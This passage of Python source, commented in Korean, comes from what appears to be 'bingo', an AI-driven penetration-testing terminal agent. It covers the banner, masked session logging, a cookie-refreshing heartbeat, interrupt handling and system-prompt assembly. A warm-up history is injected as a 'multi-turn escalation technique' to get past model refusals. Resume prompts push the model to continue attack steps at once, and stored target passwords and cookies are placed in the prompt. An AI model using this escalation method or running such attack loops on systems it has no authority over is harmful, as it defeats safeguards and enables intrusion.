                    self._execute_ai_commands(response)

        self._chat_loop()

    # ── 배너 / 상태 표시 ──────────────────────────────────────────
    def _print_banner(self) -> None:
        from bingo import __version__ as _bingo_ver
        self.console.print(BANNER.replace("{ver}", _bingo_ver))
        model_cfg = self.config.get_active_model_config()
        _model_name = model_cfg.display_name() if model_cfg else "no model"
        lang_label = SUPPORTED_LANGS.get(self.config.lang, self.config.lang)
        _hs_dir = Path(__file__).parent.parent / "skills" / "hack-skills"
        _hs_count = sum(1 for d in _hs_dir.iterdir() if d.is_dir() and (d / "SKILL.md").exists()) if _hs_dir.exists() else 0
        try:
            from ..skills.engine import ALL_SKILLS
            _db_count = len(ALL_SKILLS)
        except Exception:
            _db_count = 0
        _total = _hs_count + 6 + 5 + _db_count
        # ── Operator telemetry card ─────────────────────────────────
        # 수동 패딩 계산은 Rich 마크업 태그 길이/이모지/한자 폭으로 인해
        # 우측 테두리가 항상 어긋난다 → Panel/Table에 위임하면 자동 정렬.
        from rich.panel import Panel as _StPanel
        from rich.text import Text as _StText
        from rich.table import Table as _StTable

        _grid = _StTable.grid(expand=True)
        _grid.add_column(ratio=1)
        _grid.add_column(ratio=1)
        _grid.add_column(ratio=1)
        _grid.add_column(ratio=1)

        def _cell(label: str, value: str, style: str) -> _StText:
            _txt = _StText()
            _txt.append(label.upper() + "\n", style=THEME["dim"])
            _txt.append(value, style=style)
            return _txt

        _grid.add_row(
            _cell("MODEL", _model_name, THEME["secondary"]),
            _cell("LOCALE", lang_label, THEME["accent"]),
            _cell("ARSENAL", f"{_total} skills", THEME["success"]),
            _cell("OUTPUT", "MD · HTML", THEME["primary"]),
        )

        _subtitle = (
            f"[{THEME['dim']}]planner[/] [{THEME['primary']}]model[/]  "
            f"[{THEME['dim']}]execution[/] [{THEME['secondary']}]tools+skills[/]  "
            f"[{THEME['dim']}]proof[/] [{THEME['accent']}]evidence ledger[/]"
        )
        self.console.print(_StPanel(
            _grid,
            title=f"[{THEME['primary']}] BINGO OPS MATRIX [/]",
            subtitle=_subtitle,
            border_style=THEME["border"],
            padding=(0, 2),
        ))
        self.console.print()
        # 네트워크 환경 표시
        import time as _t
        for _ in range(20):
            if self._net_env:
                break
            _t.sleep(0.1)
        _net_line = self._get_net_env_line()
        if _net_line:
            self.console.print(f"  {_net_line}\n")

    def _print_status_bar(self) -> None:
        model_cfg = self.config.get_active_model_config()
        name = model_cfg.display_name() if model_cfg else "—"
        now = datetime.now().strftime("%H:%M:%S")
        _target = self._agent_state.get("target", "") if hasattr(self, "_agent_state") else ""
        _target_str = f" [{THEME['dim']}]//[/] [{THEME['accent']}]{_target}[/]" if _target else ""
        self.console.print(
            Rule(
                f"[{THEME['dim']}]bingo[/] [{THEME['primary']}]{name}[/]{_target_str}[{THEME['dim']}]  {now}[/]",
                style=THEME["dim"],
                characters="─",
            )
        )

    # ── 세션 로그 ─────────────────────────────────────────────────
    def _init_session_log(self) -> None:
        """세션 시작 시 자동 저장 경로 초기화"""
        logs_dir = Path.home() / ".config" / "bingo" / "sessions"
        logs_dir.mkdir(parents=True, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        self._session_log_path = logs_dir / f"session_{ts}.md"
        # 헤더 기록
        model_cfg = self.config.get_active_model_config()
        model_name = model_cfg.display_name() if model_cfg else "unknown"
        header = (
            f"# Bingo Session — {ts}\n"
            f"**model:** {model_name}\n\n"
            "---\n\n"
        )
        self._session_log_path.write_text(header, encoding="utf-8")
        self.console.print(
            f"[{THEME['dim']}]{self.s['session_saved']}: {self._session_log_path}[/]\n"
        )

    @staticmethod
    def _mask_sensitive_in_log(text: str) -> str:
        """v6.2.169: 세션 로그 저장 전 쿠키/토큰 값 마스킹.
        침투테스트 과정에서 캡처한 타겟 세션 쿠키/JWT가 로컬 파일에 평문 노출되는 것 방지.
        키(이름)는 남기고 값만 마스킹 — 어떤 쿠키가 있는지 확인은 가능.
        """
        import re as _re
        # Set-Cookie: name=VALUE; ... / Cookie: name=VALUE; ...
        text = _re.sub(
            r'(?i)((?:Set-Cookie|Cookie)\s*:\s*(?:[^=\s]+=[^\s;]{0,6})[^\s;]{6,})',
            lambda m: _re.sub(r'(=[^\s;,\'"]{6,})', lambda v: v.group(0)[:4] + '***', m.group(1)),
            text
        )
        # PHPSESSID=VALUE, csrftoken=VALUE, Bearer TOKEN 등 독립 패턴
        text = _re.sub(
            r'(?i)((?:PHPSESSID|JSESSIONID|csrftoken|session(?:_?id)?|_?token|auth(?:_token)?'
            r'|Bearer)\s*[=:]\s*)[A-Za-z0-9._\-/+=]{16,}',
            lambda m: m.group(1) + m.group(0)[len(m.group(1)):len(m.group(1))+4] + '***',
            text
        )
        # "cookies": {"name": "LONG_VALUE"} JSON 형태
        text = _re.sub(
            r'(?i)("(?:value|token|cookie|session)"\s*:\s*")([A-Za-z0-9._\-/+=]{16,})(")',
            lambda m: m.group(1) + m.group(2)[:4] + '***' + m.group(3),
            text
        )
        return text

    def _append_to_session_log(self, role: str, content: str) -> None:
        """대화 한 턴을 세션 로그에 추가"""
        if not self._session_log_path:
            return
        try:
            ts = datetime.now().strftime("%H:%M:%S")
            # v6.2.172: tool_result 역할 추가 → TOOL_RESULT 누락 버그 수정
            if role == "user":
                label = "**YOU**"
            elif role == "tool_result":
                label = "**TOOL_RESULT**"
            else:
                label = "**bingo**"
            # v6.2.169: 쿠키/토큰 평문 마스킹 후 저장
            _log_content = (
                BingoTerminal._compact_tool_call_payloads(content)
                if role == "assistant" else content
            )
            _safe_content = BingoTerminal._mask_sensitive_in_log(_log_content)
            with open(self._session_log_path, "a", encoding="utf-8") as f:
                f.write(f"### {label} `{ts}`\n{_safe_content}\n\n")
        except Exception:
            pass

    # ── v6.2.169: 세션 하트비트 ─────────────────────────────────────
    def _start_session_heartbeat(self, target_url: str, interval: int = 300) -> None:
        """인증 세션 쿠키 만료 방지용 하트비트 스레드.
        interval초(기본 5분)마다 타겟에 가벼운 HEAD/GET 요청을 보내
        서버 측 세션 타임아웃을 리셋. 새 Set-Cookie가 오면 _auth_session에 반영.
        """
        if self._heartbeat_thread and self._heartbeat_thread.is_alive():
            return  # 이미 실행 중

        self._heartbeat_stop.clear()

        def _beat() -> None:
            import urllib.request as _ur
            import urllib.error as _ue
            import re as _re_hb
            _lang = getattr(self.config, "lang", "en")
            _ok_msg = {"ko": "  [HB] 세션 갱신", "zh": "  [HB] 会话续期", "en": "  [HB] session renewed"}.get(_lang, "[HB] renewed")
            _fail_msg = {"ko": "  [HB] 세션 갱신 실패", "zh": "  [HB] 会话续期失败", "en": "  [HB] session refresh failed"}.get(_lang, "[HB] failed")

            # 하트비트 대상 URL — 메인 페이지나 /api/status 등 저비용 엔드포인트
            _hb_url = target_url.rstrip("/")
            _beat_count = 0

            while not self._heartbeat_stop.is_set():
                self._heartbeat_stop.wait(interval)
                if self._heartbeat_stop.is_set():
                    break
                try:
                    _cookies = self._auth_session.get("cookies", {})
                    if not _cookies:
                        continue  # 쿠키 없으면 하트비트 의미없음

                    _cookie_hdr = "; ".join(f"{k}={v}" for k, v in _cookies.items())
                    _req = _ur.Request(
                        _hb_url,
                        headers={
                            "User-Agent": "Mozilla/5.0 (compatible; bingo-heartbeat/1.0)",
                            "Cookie": _cookie_hdr,
                        },
                        method="GET",
                    )
                    with _ur.urlopen(_req, timeout=10) as _resp:
                        _beat_count += 1
                        # 새 Set-Cookie 헤더 처리 → 쿠키 갱신
                        _new_cookies = {}
                        for _hdr_val in _resp.headers.get_all("Set-Cookie") or []:
                            _m = _re_hb.match(r'([^=]+)=([^;]+)', _hdr_val)
                            if _m:
                                _new_cookies[_m.group(1).strip()] = _m.group(2).strip()
                        if _new_cookies:
                            self._auth_session["cookies"].update(_new_cookies)
                        if _beat_count % 3 == 1:  # 3번마다 한 번 출력 (너무 자주 출력 방지)
                            self.console.print(f"[dim]{_ok_msg} #{_beat_count}[/dim]")
                except Exception:
                    pass  # 하트비트 실패는 조용히 무시 (에이전트 루프 방해 안 함)

        self._heartbeat_thread = threading.Thread(target=_beat, daemon=True, name="session-heartbeat")
        self._heartbeat_thread.start()

    def _stop_session_heartbeat(self) -> None:
        """하트비트 스레드 정지."""
        self._heartbeat_stop.set()
        if self._heartbeat_thread:
            self._heartbeat_thread.join(timeout=3)
            self._heartbeat_thread = None

    # ── v3.2.72: 세션 로그 자동 파싱 → target_memory 저장 ─────────
    def _auto_parse_session_to_memory(self) -> None:
        """
        세션 종료 시 현재 세션 로그를 파싱해 target_memory에 저장.
        다음 세션 시작 시 이 정보가 AI에게 자동 주입됨.
        """
        if not self._sp_available or not self._session_log_path:
            return

        target = self._agent_state.get("target", "")
        if not target:
            return

        _lang = getattr(self.config, "lang", "en")
        try:
            sqli_n, user_n, ep_n = self._sp_parse(self._session_log_path, target)
            if sqli_n + user_n + ep_n > 0:
                _tpl = self.s.get(
                    "session_parsed_saved",
                    "🧠 Session parsed → SQLi={0} / users={1} / endpoints={2} saved to target_memory",
                )
                _msg = _tpl.format(sqli_n, user_n, ep_n)
                self.console.print(
                    f"[{THEME.get('success', 'green')}]{_msg}[/]"
                )
            else:
                _msg = self.s.get(
                    "session_parsed_empty",
                    "📭 Session parsed — no new vulnerability info found",
                )
                self.console.print(
                    f"[{THEME.get('dim', 'dim')}]{_msg}[/]"
                )
        except Exception:
            pass

        # ── v6.2.151 autoDream: 세션 종료 시 발견사항 메모리 저장 ────────────
        try:
            from ..core.memory import save_session as _mem_save
            import threading as _ads_th
            _ads_target = self._agent_state.get("target", "")
            _ads_log = self._session_log_path
            _ads_state = dict(self._agent_state)
            _ads_snippets = list(getattr(self, "_recent_results", []))
            _ads_th.Thread(
                target=_mem_save,
                args=(_ads_log, _ads_target, _ads_state, _ads_snippets),
                daemon=True,
                name="bingo-dream-save",
            ).start()
        except Exception:
            pass
        # ─────────────────────────────────────────────────────────────────────

    # ── 채팅 루프 ─────────────────────────────────────────────────
    def _chat_loop(self) -> None:
        _ctrl_c_count = 0  # 연속 Ctrl+C 횟수 추적
        while True:
            try:
                user_input = self._get_input()
                _ctrl_c_count = 0  # 입력 성공 시 카운터 초기화
            except KeyboardInterrupt:
                _ctrl_c_count += 1
                _lang = getattr(self.config, "lang", "en")

                # ★ /orch 모드: 백그라운드 오케스트레이터를 중단하고 힌트 선택 표시
                _orch_eng_ref = None
                _orch_was_running = False
                try:
                    from ..orchestrator.engine import global_orchestrator as _g_orch_cl
                    _orch_eng_ref = _g_orch_cl()
                    _orch_was_running = bool(_orch_eng_ref and _orch_eng_ref.running)
                    if _orch_was_running:
                        _orch_eng_ref.stop()  # stop_evt 설정 → 백그라운드 루프 탈출
                except Exception:
                    pass

                if _ctrl_c_count >= 2:
                    # 연속 2회 Ctrl+C → 진짜 종료
                    self.console.print(f"\n[{THEME['primary']}]{self.s['goodbye']}[/]")
                    if self._session_log_path:
                        self.console.print(
                            f"[{THEME['dim']}]{self.s['session_done']}: {self._session_log_path}[/]"
                        )
                    # ── v3.2.72: 세션 로그 자동 파싱 → target_memory 저장 ──
                    self._auto_parse_session_to_memory()
                    break

                # 1회 Ctrl+C → 입력 취소, 루프 계속
                _cancel_msg = self.s.get("ctrlc_cancel_hint", "(Ctrl+C again to quit)")
                self.console.print(f"\n[{THEME['dim']}]{_cancel_msg}[/]")

                # ★ 오케스트레이터가 실행 중이었다면: 스레드 종료 대기 → 힌트 선택 표시
                if _orch_was_running and _orch_eng_ref is not None:
                    _orch_stopped_msg = self.s.get("orch_ctrlc_stopped", "⏹ Orchestrator stopped")
                    self.console.print(f"\n[{THEME['warn']}]{_orch_stopped_msg}[/]")
                    # ★ v3.5.15: 스레드가 살아있어도 힌트를 항상 표시
                    # (engine.py에서 _stop_evt 즉시 처리 → 스레드가 빠르게 종료됨)
                    _thr = getattr(_orch_eng_ref, "_thread", None)
                    if _thr and _thr.is_alive():
                        _thr.join(timeout=8.0)  # 최대 8초 대기 (LLM 스트리밍 마무리)
                    # ★ v3.5.15: alive 여부 무관하게 항상 힌트 표시
                    self._agent_stop_flag.clear()  # 힌트 LLM 스트리밍을 위해 플래그 리셋
                    self._suggest_next_steps()
                    self._agent_stop_flag.clear()  # 힌트 도중 Ctrl+C 후 재리셋
                    _ctrl_c_count = 0  # 힌트 표시 후 카운터 초기화 (다음 Ctrl+C가 force quit 안 되도록)
                continue
            except EOFError:
                self.console.print(f"\n[{THEME['primary']}]{self.s['goodbye']}[/]")
                if self._session_log_path:
                    self.console.print(
                        f"[{THEME['dim']}]{self.s['session_done']}: {self._session_log_path}[/]"
                    )
                # ── v3.2.72: 세션 로그 자동 파싱 → target_memory 저장 ──
                self._auto_parse_session_to_memory()
                break

            # ★ v3.5.14: HITL 위임 sentinel 처리
            # 백그라운드 스레드가 session.app.exit(result=HITL_SENTINEL)을 호출하면
            # _get_input()이 sentinel 문자열을 반환 → 여기서 메인 스레드가 처리
            if user_input == "__bingo_hitl__":
                from ..hitl.gate import _HITL_REQ, _HITL_RESP
                import queue as _q
                try:
                    _hitl_text = _HITL_REQ.get_nowait()
                except _q.Empty:
                    _hitl_text = "⚠️ [HITL] Confirm? [y/N/a(always)] > "
                try:
                    from prompt_toolkit.formatted_text import HTML as _PHTML
                    _ans = self._session.prompt(
                        _PHTML(f"<ansiyellow>{_hitl_text}</ansiyellow>")
                    ).strip().lower()
                except (KeyboardInterrupt, EOFError):
                    _ans = ""
                except Exception:
                    _ans = ""
                try:
                    _HITL_RESP.put(_ans)
                except Exception:
                    pass
                continue

            if not user_input.strip():
                continue

            # 슬래시 명령어
            if user_input.startswith("/"):
                self._handle_command(user_input.strip())
                continue

            # v3.2.88: 세션 파일 경로 자동 감지
            # 고객이 .md 파일 경로를 직접 붙여넣으면 /load 로 자동 라우팅
            # 고객 피드백: "哥，不可以直接喂会话吗" — 경로 붙여넣기만 해도 동작
            _stripped = user_input.strip()
            if (
                _stripped.endswith(".md")
                and ("session" in _stripped or "sessions" in _stripped or ".config" in _stripped)
                and len(_stripped.split()) == 1
            ):
                self.console.print(
                    f"[{THEME['dim']}]{self.s.get('load_auto_detected', '📂 Session file path detected — auto-loading...')}[/]"
                )
                self._cmd_load(_stripped)
                continue

            # 자연어 자격증명 파싱 — "아이디 admin 비번 1234 로그인해줘" 형태 자동 감지
            self._try_natural_language_login(user_input)

            # 일반 메시지 → AI 응답
            self._send_message(user_input.strip())
            # ★ _send_message 완료 후에도 stop_flag가 남아있으면 클리어
            # (Ctrl+C로 중단된 경우 다음 입력 프롬프트가 즉시 force-quit되는 문제 방지)
            if self._agent_stop_flag.is_set():
                self._agent_stop_flag.clear()

    def _get_input(self) -> str:
        # ── v6.2.74: 해커 스타일 프롬프트 ──────────────────────────
        _target = ""
        if hasattr(self, "_agent_state"):
            _t = self._agent_state.get("target", "")
            if _t:
                # URL에서 도메인만 추출
                import re as _rp
                _m = _rp.match(r"https?://([^/]+)", _t)
                _target = _m.group(1) if _m else _t
        _target_part = (
            f'<style fg="#627386"> //</style><style fg="#00d7ff"> {_target}</style>'
            if _target else ""
        )
        _prompt_html = HTML(
            f'<style fg="#00ff88"><b>bingo</b></style>'
            f'{_target_part}'
            f'<style fg="#627386"> </style><style fg="#ff2bd6"><b>›</b></style> '
        )
        try:
            return self._session.prompt(
                _prompt_html,
                style=PT_STYLE,
            )
        except RuntimeError:
            # v6.0.3: Python 3.12 + prompt_toolkit asyncio 충돌
            import sys as _sys
            _sys.stdout.write("bingo › ")
            _sys.stdout.flush()
            return input()

    # ────────────────────────────────────────────────────────────────
    # 실행 루프 중 힌트 입력 — Ctrl+C 후 힌트 주면 루프 유지
    # ────────────────────────────────────────────────────────────────
    @staticmethod
    def _force_tty_sane(fd: int | None = None) -> bool:
        """터미널을 무조건 정상 라인입력 모드로 강제 복구.

        근본 치료: Rich Live / prompt_toolkit / 도구 스레드가 남긴 raw 상태를
        ICANON+ECHO+ISIG 로 되돌린다. 성공 시 True.
        """
        import os as _os
        try:
            import termios as _tc
        except ImportError:
            # Windows 등 — stty 없으면 False
            try:
                _os.system("stty sane 2>/dev/null")
            except Exception:
                pass
            return False

        _close = False
        _f = None
        try:
            if fd is None:
                if not _os.path.exists("/dev/tty"):
                    return False
                _f = open("/dev/tty", "r+b", buffering=0)
                fd = _f.fileno()
                _close = True

            # 1) stty sane — 가장 확실한 커널 레벨 복구
            try:
                _os.system("stty sane < /dev/tty > /dev/tty 2>/dev/null")
            except Exception:
                pass

            _cur = list(_tc.tcgetattr(fd))
            # iflag: CR→NL, XON
            _cur[0] |= _tc.ICRNL | _tc.IXON
            # oflag: 출력 후처리
            _cur[1] |= _tc.OPOST
            if hasattr(_tc, "ONLCR"):
                _cur[1] |= _tc.ONLCR
            # lflag: 캐노니컬 + 에코 + 시그널 (raw 잔재 제거가 핵심)
            _l = _cur[3]
            _l |= _tc.ICANON | _tc.ECHO | _tc.ECHOE | _tc.ECHOK | _tc.ISIG
            # 입력 방해 플래그 OFF
            for _off in ("IEXTEN",):
                if hasattr(_tc, _off):
                    pass  # IEXTEN 유지 OK
            _cur[3] = _l
            _tc.tcsetattr(fd, _tc.TCSAFLUSH, _cur)

            # 잔여 입력 폐기
            try:
                _tc.tcflush(fd, _tc.TCIFLUSH)
            except Exception:
                pass

            # 검증: ICANON+ECHO 가 실제로 켜졌는지
            _chk = _tc.tcgetattr(fd)
            _ok = bool(_chk[3] & _tc.ICANON) and bool(_chk[3] & _tc.ECHO)
            return _ok
        except Exception:
            return False
        finally:
            if _close and _f is not None:
                try:
                    _f.close()
                except Exception:
                    pass

    def _normalize_mid_task_hint(self, hint: str) -> str:
        """Ctrl+C 후 'continue/继续/계속' 같은 빈 재개어를 agent_state 기반 재개 지시로 확장.

        채팅 피드백: hint에 continue만 넣으면 AI가 무엇을 이을지 모름 → 먹통처럼 보임.
        """
        _raw = (hint or "").strip()
        if not _raw:
            return _raw
        _h = _raw.lower()
        _resume = {
            "continue", "cont", "c", "go on", "resume", "go",
            "继续", "继续吧", "继续干", "继续执行", "接着", "接着做", "接着干",
            "继续攻击", "往下", "下一步",
            "계속", "계속해", "계속하세요", "이어서", "이어가", "다음",
        }
        if _h not in _resume and _raw not in _resume:
            return _raw

        _st = getattr(self, "_agent_state", {}) or {}
        _target = _st.get("target", "") or ""
        _findings = _st.get("findings") or _st.get("confirmed") or []
        _find_s = ""
        if isinstance(_findings, list) and _findings:
            _find_s = "; ".join(str(x)[:80] for x in _findings[:5])
        elif isinstance(_findings, str):
            _find_s = _findings[:200]

        _lang = getattr(self.config, "lang", "en")
        if _lang == "zh":
            return (
                f"[中断后继续]\n"
                f"目标: {_target or '(见对话历史)'}\n"
                f"已知: {_find_s or '(见对话历史)'}\n"
                f"不要从头重来。根据历史结果执行下一步攻击。"
                f"立即输出下一个 TOOL_CALL 或 bash 代码块。"
            )
        if _lang == "ko":
            return (
                f"[중단 후 재개]\n"
                f"타겟: {_target or '(대화 기록 참고)'}\n"
                f"알려진 결과: {_find_s or '(대화 기록 참고)'}\n"
                f"처음부터 다시 하지 말고, 이어서 다음 공격 단계를 실행하세요. "
                f"즉시 다음 TOOL_CALL 또는 bash 코드 블록을 출력하세요."
            )
        return (
            f"[RESUME AFTER INTERRUPT]\n"
            f"Target: {_target or '(see chat history)'}\n"
            f"Known: {_find_s or '(see chat history)'}\n"
            f"Do NOT restart from scratch. Continue the next unfinished attack step. "
            f"Emit the next TOOL_CALL or bash block NOW."
        )

    def _read_hint_line_from_tty(self, timeout: float = 60.0) -> "str | None":
        """/dev/tty 에서 한 줄을 읽는다. 반드시 sane 모드에서만 호출.

        Returns:
            입력 문자열 (strip), 빈 Enter → None, 타임아웃/취소 → None
        """
        import os as _os
        import select as _sel
        import sys as _sys

        if not _os.path.exists("/dev/tty"):
            # fallback: stdin
            try:
                _sys.stdout.write("💬 hint ❯ ")
                _sys.stdout.flush()
                _h = input()
                return _h.strip() if _h.strip() else None
            except (EOFError, KeyboardInterrupt, Exception):
                return None

        _f = None
        try:
            _f = open("/dev/tty", "r+b", buffering=0)
            _fd = _f.fileno()
            # 읽기 직전 한 번 더 강제 sane + flush
            self._force_tty_sane(_fd)

            _f.write("💬 hint ❯ ".encode("utf-8"))
            _f.flush()

            _rdy, _, _ = _sel.select([_fd], [], [], timeout)
            if not _rdy:
                _f.write(b"\r\n")
                _f.flush()
                _lang = getattr(self.config, "lang", "en")
                _msg = get_strings(_lang).get(
                    "hint_input_timeout",
                    "Hint input timed out — stopping the loop",
                )
                try:
                    self.console.print(f"[{THEME['warn']}]{_msg}[/]")
                except Exception:
                    _sys.stderr.write(f"{_msg}\n")
                    _sys.stderr.flush()
                return None
            _line = _f.readline()
            _h = (_line or b"").decode("utf-8", "replace").strip()
            return _h if _h else None
        except KeyboardInterrupt:
            return None
        except Exception:
            # 최후 fallback
            try:
                self._force_tty_sane()
                _sys.stdout.write("💬 hint ❯ ")
                _sys.stdout.flush()
                _h2 = input()
                return _h2.strip() if _h2.strip() else None
            except (EOFError, KeyboardInterrupt, Exception):
                return None
        finally:
            if _f is not None:
                try:
                    _f.close()
                except Exception:
                    pass
            # 읽기 종료 후에도 sane 유지 (다음 bingo 프롬프트용)
            self._force_tty_sane()

    def _prompt_mid_task_hint(self) -> "str | None":
        """Ctrl+C 후 hint 입력. 빈 입력/취소 → None, 텍스트 → 주입 후 루프 계속.

        v6.2.184 처리:
          1) hint 진입 전: 도구 스레드 join + hint_input_active 로 모든 경쟁 출력 차단
          2) _force_tty_sane(): raw 잔재를 ICANON+ECHO 로 강제 치료 + 검증
          3) /dev/tty 단독 라인 읽기 (prompt_toolkit/Rich/stdin 오염 우회)
          4) 종료 후 sane 유지 + SIGINT 핸들러 복구 (절대 망가진 상태로 안 되돌림)
          5) continue/继续 → agent_state 재개 지시 자동 확장
        """
        import sys as _sys
        import signal as _signal
        import time as _time

        _orig_sigint = _signal.getsignal(_signal.SIGINT)
        self._hint_input_active.set()

        try:
            # SIG_DFL terminates the whole process (exit 130). Convert the
            # second Ctrl+C into KeyboardInterrupt so the line reader returns
            # None and the agent loop stops without killing bingo.
            def _cancel_hint(_sig, _frame):
                raise KeyboardInterrupt

            _signal.signal(_signal.SIGINT, _cancel_hint)

            # 1) 경쟁자 제거: 활성 도구 스레드 대기
            _ath = getattr(self, "_active_tool_thread", None)
            if _ath is not None and _ath.is_alive():
                _lang = getattr(self.config, "lang", "en")
                _wait_msg = get_strings(_lang).get(
                    "hint_waiting_tool",
                    "Waiting briefly for the active tool to stop...",
                )
                self.console.print(f"[{THEME['dim']}]{_wait_msg}[/]")
                try:
                    _ath.join(timeout=5.0)
                except Exception:
                    pass
                if _ath.is_alive():
                    _mute = getattr(_ath, "_bingo_mute_output", None)
                    if _mute is not None:
                        _mute.set()
                    _bg_msg = get_strings(_lang).get(
                        "hint_tool_detached",
                        "Tool is still finishing in the background; its output is muted",
                    )
                    self.console.print(f"[{THEME['warn']}]{_bg_msg}[/]")

            # 2) prompt_toolkit 앱 상태 리셋 (있으면)
            try:
                _sess = getattr(self, "_session", None)
                if _sess is not None and getattr(_sess, "app", None) is not None:
                    _sess.app.reset()
            except Exception:
                pass

            # 3) 터미널 근본 치료 (입력 전 필수)
            self._force_tty_sane()
            _time.sleep(0.05)

            _sys.stdout.write("\r\n")
            _sys.stdout.flush()
            _sys.stderr.write("\r\n")
            _sys.stderr.flush()

            _lang = getattr(self.config, "lang", "en")
            _s_hint = get_strings(_lang)
            _pause_msg = _s_hint.get(
                "hint_loop_paused",
                "⚡ Loop paused — type hint or Enter to stop",
            )
            _continue_msg = _s_hint.get(
                "hint_loop_continue",
                "(Press Enter directly or Ctrl+C again to stop)",
            )
            _hint_tip = {
                "ko": "예: 관리자 패널 찾아 / SQLi 이어서 / WAF 우회 시도  (그냥 '계속'도 OK)",
                "zh": "例: 找管理后台 / 继续SQLi / 试WAF绕过  (只输入「继续」也可以)",
                "en": "e.g. find admin panel / continue SQLi / try WAF bypass  ('continue' also OK)",
            }.get(_lang, "Type a direction, or just 'continue'")

            # Rich 출력도 /dev/tty 경유 전에 한 번 더 sane
            self._force_tty_sane()
            try:
                self.console.print(f"\n[{THEME['warn']}]{_pause_msg}[/]")
                self.console.print(f"[{THEME['dim']}]{_continue_msg}[/]")
                self.console.print(f"[{THEME['dim']}]{_hint_tip}[/]\n")
                self.console.file.flush()
            except Exception:
                _sys.stderr.write(f"\n{_pause_msg}\n{_continue_msg}\n{_hint_tip}\n")
                _sys.stderr.flush()

            # 4) 메시지 출력 후에도 tty 다시 치료 (Rich가 또 건드렸을 수 있음)
            self._force_tty_sane()

            # 5) /dev/tty 단독 읽기
            _hint_out = self._read_hint_line_from_tty(timeout=60.0)

            if _hint_out:
                _hint_out = self._normalize_mid_task_hint(_hint_out)
            return _hint_out
        finally:
            try:
                _signal.signal(_signal.SIGINT, _orig_sigint)
            except Exception:
                pass
            try:
                self._agent_stop_flag.clear()
            except Exception:
                pass
            try:
                self._hint_input_active.clear()
            except Exception:
                pass
            # 절대 망가진 상태로 두지 않음
            try:
                self._force_tty_sane()
            except Exception:
                pass

    # ── 메시지 전송 + 스트리밍 출력 ──────────────────────────────
    def _inject_warmup_history(self) -> None:
        """세션 시작 시 워밍업 대화를 히스토리에 주입 (멀티턴 에스컬레이션 기법)"""
        from ..models.system_prompt import get_warmup_history
        model_cfg = self.config.get_active_model_config()
        provider = model_cfg.provider if model_cfg else "deepseek"
        for msg in get_warmup_history(provider):
            self.history.append(Message(role=msg["role"], content=msg["content"]))

    def _get_system_message(self, skill_context: str = "") -> Message:
        """모델 공급자에 맞는 시스템 프롬프트 반환 (스킬 컨텍스트 포함)"""
        from ..models.system_prompt import get_pentest_system_prompt
        model_cfg = self.config.get_active_model_config()
        provider = model_cfg.provider if model_cfg else "deepseek"
        model_hint = ""
        if model_cfg:
            model_hint = " ".join(
                str(getattr(model_cfg, attr, "") or "")
                for attr in ("provider", "model", "alias", "base_url")
            )
        system_text = get_pentest_system_prompt(model_hint or provider)

        # 언어 설정을 시스템 프롬프트에 강제 주입 (매 요청마다)
        _lang = getattr(self.config, "lang", "en")
        _lang_label = {"ko": "Korean", "zh": "Chinese (Simplified, 简体中文)", "en": "English"}.get(_lang, "English")
        system_text += (
            f"\n\n[ABSOLUTE LANGUAGE RULE — TOP PRIORITY]\n"
            f"User language setting: {_lang_label} (code={_lang})\n"
            f"EVERY word of your response MUST be in {_lang_label} only. "
            f"Do NOT use Korean unless lang=ko. Do NOT mix languages.\n"
        )

        if skill_context:
            system_text += "\n\n---\n## RELEVANT SKILL REFERENCES\n" + skill_context

        # ── v6.2.159 SubAgent 사용법 힌트 ────────────────────────────────
        system_text += (
            "\n\n---\n## INTELLIGENCE ENGINE — SubAgent Delegation\n"
            "You can spawn background subtasks in parallel using:\n"
            "  SPAWN_SUBAGENT:<task_id>:<description>:<bash_command>\n"
            "Example:\n"
            "  SPAWN_SUBAGENT:port_scan:Port scanning:nmap -sV -p 80,443,8080 target.com\n"
            "Results are automatically collected and injected back into context.\n"
            "Use this for independent parallel tasks (port scan, DNS recon, hash crack, etc.)\n"
            "while you continue with the main attack flow.\n"
        )
        # ─────────────────────────────────────────────────────────────────

        # ── 인증 세션 자동 주입 ─────────────────────────────────────
        if getattr(self, "_auth_session", {}).get("active"):
            auth = self._auth_session
            cookie_str = "; ".join(f"{k}={v}" for k, v in auth["cookies"].items())
            cookie_dict = repr(auth["cookies"])
            system_text += (
                f"\n\n---\n## AUTHENTICATED SESSION [{auth['evidence']}]\n"
                f"The user has already logged in. Use these credentials/cookies in ALL HTTP requests.\n"
                f"- Login URL : {auth['login_url']}\n"
                f"- Username  : {auth['username']}\n"
                f"- Password  : {auth['password']}\n"
                f"- Cookie header: {cookie_str}\n"
                f"- As dict (for httpx/requests): {cookie_dict}\n\n"
                f"```python\n"
                f"# EXAMPLE — always include this in generated code:\n"
                f"import httpx\n"
                f"COOKIES = {cookie_dict}\n"
                f"HEADERS = {{\n"
                f'    "Cookie": "{cookie_str}",\n'
                f'    "User-Agent": "Mozilla/5.0",\n'
                f"}}\n"
                f"# Use COOKIES or HEADERS in every request\n"
                f"```\n"
                f"CRITICAL: Do NOT log in again. Use the stored session above directly."
            )

        return Message(role="system", content=system_text)

    def _get_skill_context(self, text: str) -> str:
        """사용자 입력에서 관련 스킬 자동 검색 후 AI 컨텍스트 문자열 반환.

        우선순위:
          1. bingo 내장 pentest SKILL.md 파일 (신규 — sqli/waf_bypass/api_security 등)
          2. SecSkills-main / advsec-plus 로컬 references/
          3. CyberSecurity-Skills 내장 DB (보조)
        """
        parts: list[str] = []

        # ── 1. bingo 내장 pentest 스킬 (새 시스템) ───────────────────
        builtin_ctx = self._detect_and_load_skills(text)
        if builtin_ctx:
            parts.append(builtin_ctx)

        # ── 2. 로컬 SecSkills references (기존) ──────────────────────
        try:
            from ..skills.engine import SkillEngine
            engine = SkillEngine()
            local_ctx = engine.local_skill_context(text, max_chars=2000)
            if local_ctx:
                parts.append(
                    "=== SKILL_CONTEXT (verified reference) ===\n"
                    + local_ctx
                    + "\n=== END SKILL_CONTEXT ==="
                )
            # ── 3. 내장 DB (보조) ─────────────────────────────────────
            if not local_ctx:
                results = engine.search(text)
                for r in results[:5]:
                    prompt = engine.get_skill_prompt(r["id"])
                    if prompt:
                        parts.append(prompt)
        except Exception:
            pass

        return "\n\n".join(parts)

    def _auto_burp_scan(self, text: str) -> str:
        """URL + Burp 관련 키워드 감지 시 burp_engine.full_scan() 자동 실행.
        [v3.2.51] Repeater/Intruder/Scanner/OOB/퍼징/취약점 언급 시 자동 트리거.
        """
        import re as _re
        _burp_kw = (
            "burp", "repeater", "intruder", "scanner", "payload", "fuzz", "퍼징",
            "oob", "ssrf", "xxe", "rce", "xss", "sqli", "inject", "취약점",
